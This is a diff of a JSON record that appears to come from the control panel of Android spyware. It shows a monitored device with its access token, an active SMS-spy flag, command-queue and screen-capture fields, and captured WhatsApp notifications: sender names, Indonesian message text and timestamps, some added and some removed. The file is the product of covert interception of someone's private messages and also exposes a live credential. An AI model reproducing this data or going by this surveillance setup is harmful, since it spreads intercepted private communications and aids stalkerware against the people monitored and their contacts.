@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776858221470,
+    "lastSeen": 1776858225327,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Menghapus pesan…",
+        "content": "‎943 dari 2234 (42%)",
+        "time": "22/04 19:43",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776858227123
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎59 pesan dari 37 chat",
+        "time": "22/04 19:43",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776858222671
+      },
       {
         "appName": "WhatsApp",
         "sender": "prily 🤍",
@@ -4003,22 +4019,6 @@
         "time": "22/04 15:11",
         "pkg": "com.whatsapp",
         "receivedAt": 1776841894037
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (31 pesan): ~ ᥬ--𝗛𝗔𝗠𝗭 || 𝗖𝘆𝗯𝗲𝗿​​᭄ツ",
-        "content": "Enter Text",
-        "time": "22/04 15:11",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776841893922
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (30 pesan): ~ Amsal",
-        "content": "• Example : .brat michelle bot",
-        "time": "22/04 15:11",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776841887024
       }
     ],
     "galleryPhotos": [],
